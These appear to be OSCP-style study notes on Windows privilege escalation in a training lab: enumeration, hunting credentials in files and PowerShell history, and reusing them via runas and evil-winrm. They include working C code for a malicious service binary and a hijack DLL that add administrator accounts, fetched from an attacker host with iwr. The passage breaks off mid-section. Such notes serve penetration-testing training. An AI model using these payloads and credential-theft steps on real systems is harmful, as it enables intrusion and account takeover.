# 17. Windows Privilege Escalation — Summary Notes

## Core Goal

After gaining an initial foothold as a low-privileged user on Windows, the objective is to escalate privileges to Administrator or SYSTEM.

Why?

- Access sensitive files
- Dump credentials/hashes
- Run tools like:
    - Mimikatz
- Modify system settings
- Move laterally

---

# 17.1 Enumerating Windows

## Purpose of Enumeration

Every Windows machine is different:

- OS version
- Patch level
- Installed software
- Services
- Misconfigurations

Enumeration helps identify:

- Privilege escalation vectors
- Sensitive files
- Vulnerable services
- Misconfigured permissions

---

# Windows Security Concepts

---

# 1. SID (Security Identifier)

Windows identifies users/groups using SIDs, NOT usernames.

Example:

```
S-1-5-21-1336799502-1441772794-948155058-1001
```

Structure:

```
S-R-X-Y
```

|Part|Meaning|
|---|---|
|S|SID literal|
|R|Revision (usually 1)|
|X|Identifier authority|
|Y|Domain/local machine + RID|

---

## RID (Relative Identifier)

Important RIDs:

|RID|Meaning|
|---|---|
|500|Administrator|
|1000+|Regular users|

---

## Important Well-Known SIDs

|SID|Meaning|
|---|---|
|S-1-0-0|Nobody|
|S-1-1-0|Everyone|
|S-1-5-11|Authenticated Users|
|S-1-5-18|Local System|
|S-1-5-domain-500|Administrator|

---

# 2. Access Tokens

After login, Windows creates an access token.

The token contains:

- User SID
- Group SIDs
- Privileges
- Security context

Processes inherit the user's token.

---

## Types of Tokens

### Primary Token

Assigned to:

- Processes
- Threads

Defines normal permissions.

---

### Impersonation Token

Allows a thread to act as another user.

Very important in:

- Token impersonation attacks
- Potato attacks
- Named pipe impersonation

---

# 3. Mandatory Integrity Control (MIC)

Windows uses integrity levels to prevent lower-trust processes from modifying higher-trust objects.

---

## Integrity Levels

|Level|Description|
|---|---|
|System|Highest trust|
|High|Elevated admin|
|Medium|Standard users|
|Low|Sandboxed apps|
|Untrusted|Highly restricted|

---

## Important Rules

Lower integrity cannot modify higher integrity objects.

Even administrators usually run at:

```
Medium Integrity
```

until elevated.

---

# 4. User Account Control (UAC)

UAC prevents administrators from automatically running everything as admin.

Administrative users receive TWO tokens:

|Token|Purpose|
|---|---|
|Standard token|Normal operations|
|Administrator token|Elevated operations|

Elevation requires:

- UAC prompt
- Consent

---

## Important Concept

Being in Administrators group ≠ high integrity automatically.

Most admin processes still run as:

```
Medium Integrity
```

until elevated.

---

# Situational Awareness Enumeration

Goal:

- Understand the target
- Find escalation paths

---

# Useful Enumeration Commands

---

## Current User

```
whoami
```

---

## User Privileges

```
whoami /priv
```

Shows privileges like:

- SeImpersonatePrivilege
- SeBackupPrivilege

---

## Group Memberships + Integrity Level

```
whoami /groups
```

Useful for:

- Integrity level
- Group memberships

---

## System Information

```
systeminfo
```

Useful for:

- OS version
- Patch level
- Architecture

---

## Hostname

```
hostname
```

---

## Environment Variables

```
set
```

or

```
Get-ChildItem Env:
```

---

## Running Processes

```
tasklist
```

Detailed:

```
tasklist /svc
```

PowerShell:

```
Get-Process
```

---

## Network Connections

```
netstat -ano
```

Useful for:

- Listening ports
- PID mapping

---

## Users

```
net user
```

Specific user:

```
net user username
```

---

## Local Groups

```
net localgroup
```

Administrators group:

```
net localgroup administrators
```

---

## Services

```
sc query
```

PowerShell:

```
Get-Service
```

---

# Searching for Sensitive Information

Often easier than exploiting vulnerabilities.

---

## Search for Password Files

```
dir /s *pass* == *cred* == *vnc* == *.config*
```

PowerShell:

```
Get-ChildItem -Recurse -Include *pass*,*cred*,*.config*
```

---

## Search Registry for Passwords

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```

---

## PowerShell History

Very important.

Default location:

```
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

View:

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Saved Credentials

```
cmdkey /list
```

---

## Unattended Install Files

Common locations:

```
C:\Unattend.xmlC:\Windows\Panther\C:\Windows\Panther\Unattend\
```

Search:

```
dir /s unattend.xml
```

---

# Automated Enumeration Tools

---

## WinPEAS

Most common Windows privilege escalation enumerator.

WinPEAS

Checks:

- Services
- Registry
- Credentials
- Scheduled tasks
- Vulnerabilities
- Permissions

---

## Seatbelt

Seatbelt

Focuses on:

- Security misconfigurations
- Credential artifacts
- System information

---

## PowerUp

PowerUp

PowerShell-based privesc checks.

---

# Important Privilege Escalation Mindset

Enumeration is EVERYTHING.

Most successful privilege escalation comes from:

- Misconfigurations
- Weak permissions
- Stored credentials
- Forgotten files
- Poor service configurations

—not kernel exploits.

---

# High-Value Things to Check

|Target|Why Important|
|---|---|
|Services|Weak permissions|
|Scheduled Tasks|Writable executables|
|PowerShell history|Leaked credentials|
|Registry|Auto-logon creds|
|Installed software|Vulnerabilities|
|Running processes|Credential exposure|
|Saved creds|Immediate escalation|
|Token privileges|Potato attacks|

---

# Especially Important Privileges

```
SeImpersonatePrivilegeSeAssignPrimaryTokenPrivilegeSeBackupPrivilegeSeRestorePrivilegeSeDebugPrivilege
```

These often lead directly to SYSTEM.

---

# Quick Workflow

## 1. Basic Enumeration

```
whoami /privsysteminfonet usernet localgroup administrators
```

---

## 2. Check Services

```
sc query
```

---

## 3. Search for Credentials

```
cmdkey /listreg query HKLM /f password /t REG_SZ /s
```

---

## 4. Check PowerShell History

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## 5. Run Automated Tools

- WinPEAS
- Seatbelt
- PowerUp

---

# 17.1.2 Situational Awareness — Summary Notes

# Goal of Situational Awareness

After obtaining initial access to a Windows machine, the next step is:

```
Understand the target system completely before privilege escalation.
```

Purpose:

- Identify escalation vectors
- Understand machine role
- Find privileged users
- Discover sensitive services
- Detect lateral movement opportunities

Experienced pentesters spend significant time on enumeration because it often reveals:

- Credentials
- Misconfigurations
- Valuable users
- Network pivots
- Vulnerable applications

---

# Key Information to Gather

|Information|Why Important|
|---|---|
|Username + hostname|Identify user/machine role|
|Group memberships|Detect elevated permissions|
|Existing users/groups|Identify privileged targets|
|OS/version/architecture|Exploit compatibility|
|Network information|Pivoting opportunities|
|Installed applications|Vulnerabilities/misconfigs|
|Running processes|Active services/credentials|

---

# Initial Access Example

Connect to bind shell:

```
nc 192.168.50.220 4444
```

---

# 1. Username and Hostname

Command:

```
whoami
```

Example output:

```
clientwk220\dave
```

---

## Information Learned

|Item|Value|
|---|---|
|Hostname|CLIENTWK220|
|Username|dave|

---

## Important Enumeration Insight

Hostname often reveals machine purpose:

|Hostname|Possible Role|
|---|---|
|WEB01|Web server|
|MSSQL01|SQL server|
|CLIENTWK220|Workstation/client|

---

# 2. Group Memberships

Command:

```
whoami /groups
```

---

## Important Findings

User `dave` belongs to:

- helpdesk
- Remote Desktop Users
- BUILTIN\Users

---

## Key Insight

### helpdesk

May have:

- Elevated access
- Internal tools
- Reset permissions

### Remote Desktop Users

Can log in via RDP.

Potential future GUI access.

---

# 3. Enumerating Local Users

Start PowerShell:

```
powershell
```

List users:

```
Get-LocalUser
```

---

## Important Users Found

|User|Notes|
|---|---|
|Administrator|Disabled|
|dave|Current user|
|daveadmin|Likely admin account|
|BackupAdmin|Likely privileged|
|offsec|Additional user|
|steve|Regular user|

---

# Important Pentest Insight

Admins commonly use:

|Account Type|Purpose|
|---|---|
|Standard account|Daily work|
|Privileged account|Administrative tasks|

Example:

```
dave  -> normal accountdaveadmin -> admin account
```

---

# 4. Enumerating Local Groups

Command:

```
Get-LocalGroup
```

---

## Interesting Custom Groups

|Group|Why Important|
|---|---|
|adminteam|Administrative privileges|
|BackupUsers|Backup-related permissions|
|helpdesk|Possible delegated rights|

---

# Important Built-In Groups

|Group|Capability|
|---|---|
|Administrators|Full control|
|Backup Operators|Backup/restore all files|
|Remote Desktop Users|RDP access|
|Remote Management Users|WinRM access|

---

# 5. Enumerating Group Members

Command:

```
Get-LocalGroupMember adminteam
```

```
Get-LocalGroupMember Administrators
```

---

## Important Findings

Local admins:

- daveadmin
- BackupAdmin
- offsec

---

# Key Enumeration Insight

High-value targets identified:

```
daveadminBackupAdmin
```

Potential escalation path:

- Steal credentials
- Token impersonation
- Password reuse
- Credential dumping

---

# 6. Operating System Enumeration

Command:

```
systeminfo
```

---

## Important Information Collected

|Item|Value|
|---|---|
|OS|Windows 11 Pro|
|Build|22621|
|Version|22H2|
|Architecture|x64|

---

# Why Architecture Matters

64-bit binaries cannot run on 32-bit systems.

Important for:

- Exploits
- Payloads
- PrivEsc tools

---

# 7. Network Enumeration

## Network Interfaces

Command:

```
ipconfig /all
```

---

## Important Information

|Item|Example|
|---|---|
|IP Address|192.168.50.220|
|Gateway|192.168.50.254|
|DNS Server|8.8.8.8|
|MAC Address|Present|
|DHCP|Disabled|

---

# Why This Matters

Useful for:

- Pivoting
- Lateral movement
- Network mapping
- Internal infrastructure discovery

---

# 8. Routing Table

Command:

```
route print
```

---

## Purpose

Discover:

- Additional networks
- Internal routes
- Hidden segments
- VPN connections

---

# 9. Active Network Connections

Command:

```
netstat -ano
```

---

# Important Listening Ports Found

|Port|Service|
|---|---|
|80|HTTP|
|443|HTTPS|
|445|SMB|
|3306|MySQL|
|3389|RDP|
|4444|Bind shell|

---

# Important Discovery

RDP session exists:

```
192.168.50.220:3389 <- 192.168.48.3
```

Meaning:

```
Another user is actively logged in.
```

---

# Pentest Implication

After privilege escalation:

Possible credential dumping using:

Mimikatz

Potentially recover:

- Cleartext passwords
- NTLM hashes
- Kerberos tickets

---

# 10. Installed Applications

## 32-bit Applications

Command:

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

---

## 64-bit Applications

Command:

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

---

# Interesting Applications Found

|Application|Why Important|
|---|---|
|FileZilla|Stores FTP creds|
|KeePass|Password database|
|XAMPP|Apache/MySQL stack|
|7-Zip|Possible archive creds|
|VMware Tools|VM environment|

---

# Key Pentest Insight

### KeePass

Potential targets:

- `.kdbx` databases
- Master password attacks
- Password reuse

### XAMPP

Indicates:

- Apache
- MySQL

Potential web exploitation paths.

---

# Additional Directories to Check

Applications may not appear in registry.

Check manually:

```
C:\Program Files\C:\Program Files (x86)\C:\Users\<user>\Downloads\
```

---

# 11. Running Processes

Command:

```
Get-Process
```

---

# Important Processes Found

|Process|Meaning|
|---|---|
|mysqld|MySQL running|
|httpd|Apache running|
|powershell|Interactive shells|
|filezilla|FTP client active|

---

# Correlating Enumeration Data

Combine:

- `netstat`
- installed apps
- running processes

Example:

```
mysqld + XAMPP + port 3306
```

indicates:

```
MySQL server launched via XAMPP
```

---

# Overall Findings Summary

---

# Users & Groups

## Important Users

- dave
- daveadmin
- BackupAdmin
- offsec

## Important Groups

- helpdesk
- adminteam
- Administrators

---

# System Information

|Item|Value|
|---|---|
|OS|Windows 11 Pro|
|Build|22621|
|Architecture|x64|

---

# Network Services

|Port|Service|
|---|---|
|80/443|Apache|
|3306|MySQL|
|3389|RDP|
|4444|Bind shell|

---

# Installed Software

- XAMPP
- FileZilla
- KeePass
- 7-Zip

---

# Most Important Enumeration Concepts

---

# 1. Correlation Matters

Enumeration data becomes powerful when combined.

Example:

```
RDP session + admin user + Mimikatz
```

creates a realistic escalation path.

---

# 2. Look for High-Value Targets

Especially:

- Admin accounts
- Backup accounts
- Service accounts
- Password managers
- Remote access users

---

# 3. Not Every Machine Needs PrivEsc

Real-world goal:

```
Gain meaningful access to the environment.
```

—not necessarily SYSTEM on every host.

---

# Core Situational Awareness Commands Cheat Sheet

| Purpose        | Command                            |
| -------------- | ---------------------------------- |
| Current user   | `whoami`                           |
| Groups         | `whoami /groups`                   |
| Local users    | `Get-LocalUser`                    |
| Local groups   | `Get-LocalGroup`                   |
| Group members  | `Get-LocalGroupMember <group>`     |
| OS info        | `systeminfo`                       |
| Network config | `ipconfig /all`                    |
| Routes         | `route print`                      |
| Connections    | `netstat -ano`                     |
| Installed apps | `Get-ItemProperty ...Uninstall...` |
| Processes      | `Get-Process`                      |

# 17.1.3 Hidden in Plain View — Summary Notes

# Core Concept

Many privilege escalations happen because users leave credentials:

- Text files
- Notes
- Config files
- Password managers
- PowerShell artifacts

Modern equivalent of:

```
Password on a sticky note under keyboard
```

---

# Key Mindset

Enumeration is cyclical.

Every time you gain access as a new user:

```
Repeat enumeration again.
```

Because new users may have:

- Different file permissions
- New accessible directories
- Additional credentials
- More network access

---

# Initial Objective

Based on earlier enumeration:

- KeePass installed
- XAMPP installed

Search for:

- Password databases
- Config files
- Sensitive documents

---

# 1. Searching for KeePass Databases

Command:

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

---

## Purpose

Search entire drive for:

```
KeePass database files
```

Extension:

```
.kdbx
```

---

## Result

No KeePass databases found.

---

# 2. Searching XAMPP Configuration Files

Command:

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

---

# Important Files Found

|File|Purpose|
|---|---|
|passwords.txt|XAMPP default passwords|
|my.ini|MySQL configuration|
|xampp-control.ini|XAMPP config|

---

# Reading Files

## Read passwords.txt

Command:

```
type C:\xampp\passwords.txt
```

or

```
cat C:\xampp\passwords.txt
```

---

## Important Finding

Default credentials discovered:

```
User: newuserPassword: wampp
```

But mostly default/unmodified credentials.

---

# Access Denied Example

Command:

```
type C:\xampp\mysql\bin\my.ini
```

Result:

```
Access denied
```

---

# Key Lesson

Permission denied as one user does NOT mean inaccessible forever.

Later access as another user may work.

---

# 3. Searching User Home Directories

Command:

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

---

# Goal

Search for:

- Notes
- Passwords
- Meeting docs
- Credentials
- Internal documentation

---

# Important Discovery

Found:

```
C:\Users\dave\Desktop\asdf.txt
```

---

# Reading the File

Command:

```
cat Desktop\asdf.txt
```

---

# Credentials Found

Meeting notes revealed:

```
Steve password:securityIsNotAnOption++++++
```

---

# Key Insight

Context matters.

Earlier enumeration already identified:

```
User steve exists
```

Without situational awareness, this credential may have been ignored.

---

# 4. Enumerating Steve

Command:

```
net user steve
```

---

# Important Findings

Steve belongs to:

- helpdesk
- Remote Desktop Users
- Remote Management Users

---

# Important Pentest Insight

Membership in:

```
Remote Desktop Users
```

means:

```
RDP access possible
```

---

# Escalation Path

```
dave -> steve
```

via discovered password.

---

# RDP Access

Use discovered credentials to RDP into system.

After becoming steve:

```
Repeat enumeration again
```

---

# 5. Revisiting Previously Inaccessible Files

As steve:

Command:

```
type C:\xampp\mysql\bin\my.ini
```

---

# Important Discovery

Config file revealed:

```
# backupadmin Windows password for backup job[client]password = admin123admin123!
```

---

# Critical Finding

Comment explicitly states:

```
Password belongs to Windows user backupadmin
```

---

# 6. Enumerating BackupAdmin

Command:

```
net user backupadmin
```

---

# Important Findings

BackupAdmin belongs to:

- Administrators
- BackupUsers

---

# Key Limitation

BackupAdmin NOT in:

- Remote Desktop Users
- Remote Management Users

Meaning:

```
Cannot RDP or WinRM directly
```

---

# 7. Using Runas

Because GUI access exists via RDP as steve.

---

## Run Command as Another User

Command:

```
runas /user:backupadmin cmd
```

---

# Purpose

Launch:

```
cmd.exe as backupadmin
```

---

# Important Note

`runas` requires:

- GUI access
- Interactive password prompt

Often fails in:

- Netcat shells
- Basic bind/reverse shells

---

# Alternative Methods

If `runas` unavailable:

|Method|Requirement|
|---|---|
|RDP|Remote Desktop Users|
|WinRM|Remote Management Users|
|Scheduled Tasks|Batch logon rights|
|PsExec|Existing active session|

---

# Verifying Access

Command:

```
whoami
```

Output:

```
clientwk220\backupadmin
```

---

# Successful Privilege Escalation Chain

```
dave  ↓Find Steve password in text file  ↓steve  ↓Access my.ini  ↓Find backupadmin password  ↓runas  ↓backupadmin (Administrator)
```

---

# Major Lesson

No exploits used.

Entire privilege escalation succeeded via:

```
Poor credential hygiene
```

---

# Password Reuse Principle

Always try discovered passwords against:

- Other users
- RDP
- WinRM
- Services
- Databases
- Admin accounts

Because:

```
Users frequently reuse passwords.
```

---

# 17.1.4 Information Goldmine — PowerShell

# Core Concept

Modern enterprises log PowerShell heavily.

This creates:

```
A treasure trove of credentials and commands.
```

---

# Important PowerShell Logging Mechanisms

|Mechanism|Purpose|
|---|---|
|PowerShell History|Command history|
|PSReadLine History|Saved console history|
|PowerShell Transcription|Full console recording|
|Script Block Logging|Full script logging|

---

# 1. Checking PowerShell History

Command:

```
Get-History
```

---

# Important Note

Often empty because admins run:

```
Clear-History
```

---

# Critical Weakness

`Clear-History` does NOT clear:

```
PSReadLine history
```

---

# 2. Locate PSReadLine History File

Command:

```
(Get-PSReadlineOption).HistorySavePath
```

---

# Default Path

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

# Read History File

Command:

```
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

# Important Discoveries

History revealed:

```
Register-SecretVault -Name pwmanager
```

```
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@"
```

---

# Key Insight

History files may expose:

- Passwords
- Internal systems
- Admin workflows
- Secret vault usage
- Remoting activity

---

# 3. PowerShell Transcription

History showed:

```
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
```

---

# Read Transcript File

Command:

```
type C:\Users\Public\Transcripts\transcript01.txt
```

---

# Important Discovery

Transcript exposed plaintext credentials:

```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
```

```
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

---

# Key Lesson

PowerShell transcripts can leak:

- Plaintext passwords
- Credential objects
- Admin sessions
- Internal servers

---

# 4. Using Stolen Credentials

## Create SecureString

```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
```

---

## Create Credential Object

```
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

---

## Start PowerShell Remoting Session

```
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

---

# Result

Obtained shell as:

```
clientwk220\daveadmin
```

---

# Important Note About WinRM

PowerShell Remoting usually uses:

```
WinRM
```

Users generally need membership in:

```
Remote Management Users
```

---

# Problem with Bind Shells

WinRM inside netcat shells may behave poorly.

Symptoms:

- No command output
- Broken interactivity

---

# Better Solution — Evil-WinRM

Evil-WinRM

Command:

```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

---

# Why Evil-WinRM Is Preferred

Features:

- Stable PowerShell interaction
- File upload/download
- Pass-the-hash
- In-memory execution

---

# Most Important Takeaways

---

# Hidden in Plain View

Always search:

- Desktop notes
- Config files
- Password managers
- Documents
- Scripts
- Downloads

---

# PowerShell Artifacts Are Goldmines

Always check:

```
(Get-PSReadlineOption).HistorySavePath
```

and transcript directories.

---

# Enumeration Is Cyclical

New user access means:

```
Start enumeration again from scratch.
```

---

# Password Reuse Is Extremely Common

Always test credentials against:

- Users
- RDP
- WinRM
- Databases
- Services

---

# Most Important Commands Cheat Sheet

| Purpose             | Command                                  |
| ------------------- | ---------------------------------------- |
| Search KeePass DBs  | `Get-ChildItem -Include *.kdbx`          |
| Search config/docs  | `Get-ChildItem -Include *.txt,*.ini,...` |
| Read file           | `type file.txt`                          |
| Read file           | `cat file.txt`                           |
| Enumerate user      | `net user steve`                         |
| Run as another user | `runas /user:user cmd`                   |
| PowerShell history  | `Get-History`                            |
| PSReadLine path     | `(Get-PSReadlineOption).HistorySavePath` |
| Read PS history     | `type ConsoleHost_history.txt`           |
| Read transcript     | `type transcript01.txt`                  |
| Create SecureString | `ConvertTo-SecureString`                 |
| Create PSCredential | `New-Object PSCredential`                |
| Start PSSession     | `Enter-PSSession`                        |
| WinRM shell         | `evil-winrm ...`                         |

# 17.1.5 Automated Enumeration — Notes Summary

## Core Idea

Manual enumeration is powerful but slow.  
In real penetration tests, time constraints make **automated enumeration tools essential**.

Main tools mentioned:

- winPEAS
- Seatbelt
- JAWS
- PowerUp.ps1

Key lesson:

> Never blindly trust automated tools.  
> Use them to accelerate enumeration, then verify findings manually.

---

# winPEAS Overview

## Purpose

Automates Windows privilege escalation enumeration.

Helps identify:

- Users/groups
- Services
- Permissions
- Sensitive files
- Installed software
- Misconfigurations
- PrivEsc vectors

---

# Download & Transfer winPEAS

## On Kali

Copy binary:

```
cp /usr/share/peass/winpeas/winPEASx64.exe .
```

Start web server:

```
python3 -m http.server 80
```

---

## On Target (PowerShell)

Download winPEAS:

```
iwr -uri http://<KALI-IP>/winPEASx64.exe -Outfile winPEAS.exe
```

Run it:

```
.\winPEAS.exe
```

---

# winPEAS Output Legend

|Color|Meaning|
|---|---|
|Red|Potential misconfiguration / privilege escalation|
|Green|Security protection enabled|
|Cyan|Active users|
|Blue|Disabled users|
|LightYellow|Links|

---

# Important winPEAS Findings

## 1. Basic System Information

Command:

```
.\winPEAS.exe
```

Shows:

- OS version
- Architecture
- Hostname
- Domain membership
- Installed patches
- Privileges
- Virtualization

### Important Lesson

winPEAS incorrectly identified:

- Windows 11 → as Windows 10

Therefore:

> Tool output can be inaccurate.

---

# 2. PowerShell Transcript Enumeration

winPEAS checks:

```
PS default transcripts history
```

But it missed the actual transcript file.

Lesson:

> Automated tools may miss critical artifacts.

Manual verification still required.

---

# 3. User Enumeration

winPEAS displayed:

- All users
- Group memberships
- Privileged accounts
- RDP/WinRM users

Example findings:

|User|Important Groups|
|---|---|
|backupadmin|Administrators|
|daveadmin|Administrators + Remote Management Users|
|steve|RDP + WinRM|

Very useful for:

- Lateral movement
- Password reuse
- WinRM targeting
- RDP access

---

# 4. Password File Discovery

Section:

```
Looking for possible password files in users homes
```

Example findings:

```
passwords.txtRoamingCredentialSettings.xml
```

However:

- winPEAS missed `asdf.txt` on Desktop

Again proving:

> Manual searches still matter.

---

# Key Takeaways About Automated Enumeration

## Strengths

Automated tools:

- Save huge amounts of time
- Aggregate large datasets
- Identify obvious weaknesses
- Improve situational awareness

Essential in real environments with:

- Thousands of files
- Many users
- Large infrastructures

---

## Weaknesses

Automated tools may:

- Miss files
- Miss credentials
- Misidentify OS versions
- Fail exploitation
- Trigger AV

Therefore:

> Automation complements manual enumeration — it does not replace it.

---

# Seatbelt

## Purpose

Another Windows enumeration tool.

Can enumerate:

- Installed software
- Credentials
- Services
- Browser data
- System configs

---

# Running Seatbelt

## Download / compile Seatbelt

Search suggestion from course:

```
compiled seatbelt github download
```

---

## Run Seatbelt

```
Seatbelt.exe -group=all
```

---

## Example Use

Find installed software:

```
InstalledProducts
```

Used in lab to locate:

- XAMPP version (`DisplayVersion`)

---

# Windows Services — Core Concepts

## Windows Services

Background processes managed by:

- Service Control Manager (SCM)

Equivalent to:

- Linux daemons

Can run as:

- LocalSystem
- Network Service
- Local Service
- Domain users
- Local users

---

# 17.2.1 Service Binary Hijacking

## Core Idea

If a service binary is writable by low-privileged users:

- Replace service executable
- Restart service
- Malicious binary executes as service account

Potentially:

- SYSTEM privileges

---

# Enumerating Services

## List Running Services

```
Get-CimInstance -ClassName win32_service |Select Name,State,PathName |Where-Object {$_.State -like 'Running'}
```

Interesting services:

```
Apache2.4mysql
```

Because binaries located in:

```
C:\xampp\
```

instead of:

```
C:\Windows\System32
```

Meaning:

- User-installed software
- More likely misconfigured

---

# Checking Service Binary Permissions

## Using icacls

### Apache Binary

```
icacls "C:\xampp\apache\bin\httpd.exe"
```

Result:

```
BUILTIN\Users:(RX)
```

Only:

- Read
- Execute

NOT vulnerable.

---

## MySQL Binary

```
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

Result:

```
BUILTIN\Users:(F)
```

Meaning:

- Full Access
- Writable by low-privileged users

VULNERABLE.

---

# Malicious Service Binary

## C Payload

```
#include <stdlib.h>int main (){  system ("net user dave2 password123! /add");  system ("net localgroup administrators dave2 /add");  return 0;}
```

Purpose:

- Create local admin user

---

# Cross-Compile on Kali

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

---

# Replace Service Binary

## Download Payload

```
iwr -uri http://<KALI-IP>/adduser.exe -Outfile adduser.exe
```

---

## Backup Original Binary

```
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
```

---

## Replace Binary

```
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

---

# Restarting Service

Attempt:

```
net stop mysql
```

Result:

```
Access is denied
```

No permission to restart service.

---

# Check Startup Type

```
Get-CimInstance -ClassName win32_service |Select Name, StartMode |Where-Object {$_.Name -like 'mysql'}
```

Result:

```
mysql Auto
```

Meaning:

- Service auto-starts after reboot

---

# Check Shutdown Privilege

```
whoami /priv
```

Interesting privilege:

```
SeShutdownPrivilege
```

Allows reboot.

---

# Reboot Machine

```
shutdown /r /t 0
```

---

# Verify Exploit Worked

## Check Administrators Group

```
Get-LocalGroupMember administrators
```

Result includes:

```
CLIENTWK220\dave2
```

Privilege escalation successful.

---

# Restore Original Binary

After exploit:

1. Delete malicious binary
2. Restore original `mysqld.exe`
3. Reboot system

Important for:

- Cleanup
- Stability
- Avoiding detection

---

# PowerUp.ps1

## Purpose

PowerShell privilege escalation framework.

Useful functions:

- Service abuse
- Weak permissions
- DLL hijacks
- Registry issues
- Scheduled tasks

---

# Download PowerUp

## On Kali

```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```

Start web server:

```
python3 -m http.server 80
```

---

## On Target

Download:

```
iwr -uri http://<KALI-IP>/PowerUp.ps1 -Outfile PowerUp.ps1
```

Run PowerShell bypass:

```
powershell -ep bypass
```

Import script:

```
. .\PowerUp.ps1
```

---

# Find Vulnerable Services

```
Get-ModifiableServiceFile
```

Important output:

```
ServiceName : mysqlModifiableFile : C:\xampp\mysql\bin\mysqld.exeStartName : LocalSystemCanRestart : False
```

Meaning:

- Binary writable
- Runs as SYSTEM
- Cannot restart manually

---

# AbuseFunction

Suggested command:

```
Install-ServiceBinary -Name 'mysql'
```

Expected behavior:

- Creates local admin:
    - john
    - Password123!

---

# Important Tool Failure

PowerUp incorrectly failed exploitation because:

- Service path contained additional arguments
- Included another path (`my.ini`)
- Parsing bug in `Get-ModifiablePath`

Example problematic path:

```
C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
```

Lesson:

> Automated exploitation may fail even when vulnerability exists.

Manual exploitation remains critical.

---

# Key Commands Cheat Sheet

## winPEAS

```
.\winPEAS.exe
```

---

## Enumerate Services

```
Get-CimInstance -ClassName win32_service |Select Name,State,PathName
```

---

## Check File Permissions

```
icacls "C:\path\binary.exe"
```

---

## Download File

```
iwr -uri http://<IP>/file.exe -Outfile file.exe
```

---

## Check Startup Type

```
Get-CimInstance -ClassName win32_service |Select Name, StartMode
```

---

## Check Privileges

```
whoami /priv
```

---

## Reboot

```
shutdown /r /t 0
```

---

## Check Administrators Group

```
Get-LocalGroupMember administrators
```

---

## Import PowerUp

```
. .\PowerUp.ps1
```

---

## Find Writable Service Binaries

```
Get-ModifiableServiceFile
```

---

# Exam / OSCP Takeaways

## Always Check

- Writable service binaries
- Service permissions
- Startup type
- User privileges
- Installed software directories
- XAMPP / custom apps
- Weak ACLs

---

## Remember

### User-installed software paths are suspicious

Examples:

```
C:\xampp\C:\tools\C:\ProgramData\
```

---

## Service Binary Hijacking Flow

1. Enumerate services
2. Check binary permissions
3. Replace binary
4. Restart service or reboot
5. Gain elevated execution

---

## Never Trust Tools Blindly

winPEAS and PowerUp:

- Helpful
- Fast
- Essential

BUT:

- Miss findings
- Misreport vulnerabilities
- Fail exploitation

Always validate manually.

# Windows Privilege Escalation — Notes & Key Commands

# 17.2.2 DLL Hijacking

## Core Idea

Applications/services load DLLs using the Windows DLL search order.

If:

- A DLL is missing
- The app searches a writable directory first
- We can place a malicious DLL there

→ Our DLL executes with the privileges of whoever launches the app.

---

# DLL Search Order (Safe DLL Search Mode)

Windows searches:

1. Application directory
2. System32
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

Important:

- Application directory is searched FIRST
- Missing DLLs are ideal hijack targets

---

# Enumeration

## Installed Applications

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

---

# Check Write Permissions

```
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

If successful → writable directory.

---

# Procmon (Process Monitor)

Used to:

- Monitor DLL loading
- Detect missing DLLs
- Identify NAME NOT FOUND

---

# Procmon Filters

## Filter by Process

- Process Name
- is
- filezilla.exe
- Include

---

## Filter by DLL Name

- Operation → CreateFile
- Path contains → TextShaping.dll

---

# Vulnerable DLL

Example:

```
TextShaping.dll
```

Procmon showed:

```
NAME NOT FOUND
```

inside:

```
C:\FileZilla\FileZilla FTP Client\
```

Perfect DLL hijack target.

---

# Malicious DLL Code

## Basic DLL Skeleton

```
#include <stdlib.h>#include <windows.h>BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved ){    switch ( ul_reason_for_call )    {        case DLL_PROCESS_ATTACH:        system("net user dave3 password123! /add");        system("net localgroup administrators dave3 /add");        break;    }    return TRUE;}
```

---

# Compile DLL

```
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

---

# Transfer DLL

## Start Web Server

```
python3 -m http.server 80
```

## Download on Target

```
iwr -uri http://ATTACKER-IP/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

---

# Verify Privilege Escalation

```
